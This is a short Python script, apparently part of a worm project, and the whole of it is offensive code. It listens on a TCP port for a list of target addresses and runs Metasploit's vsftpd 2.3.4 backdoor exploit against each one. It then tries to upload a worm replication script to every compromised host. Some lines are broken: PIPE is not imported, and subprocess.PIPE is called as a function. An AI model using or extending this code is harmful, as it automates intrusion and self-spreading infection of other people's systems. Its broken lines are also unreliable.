#!/usr/bin/env python3
from nclib import TCPServer
import subprocess

def listener():

	server = TCPServer(("192.168.56.108", 1337))
	for client in server:
		target_list = client.recv()

		target_list = str(target_list.rstrip())

		target_list = target_list[3:-2]

		target_list = target_list.split(',')

		print(target_list)
		return target_list

def generate(target):
	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
	subprocess.Popen(["msfconsole", "-q", "-x", exploit], stdin=PIPE)
	subprocess.PIPE("upload /home/peyton/Documents/Worm/wormreplicate.py /")
	

	
target_list = listener()

for target in target_list:
	generate(target)
